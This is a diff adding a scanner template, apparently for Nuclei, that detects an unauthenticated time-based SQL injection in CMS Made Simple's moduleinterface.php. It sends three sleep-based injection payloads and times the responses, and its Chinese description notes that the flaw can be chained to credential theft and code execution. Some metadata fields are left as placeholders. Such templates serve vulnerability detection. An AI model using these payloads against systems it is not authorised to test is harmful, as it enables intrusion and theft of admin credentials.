@@ -1,0 +1,24 @@
+id: CMS-Made-Simple-moduleinterface-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 在 2.2.9.1 之前的版本中，CMS Made Simple 存在一个未验证的 SQL 注入漏洞，攻击者可利用该漏洞获取管理员密码或密码重置令牌。结合后台的 SSTI 漏洞（CVE-2021-26120），攻击者可在目标服务器上执行任意代码。
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(3))--+"
+      - "{{BaseURL}}/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(6))--+"
+      - "{{BaseURL}}/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(9))--+"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
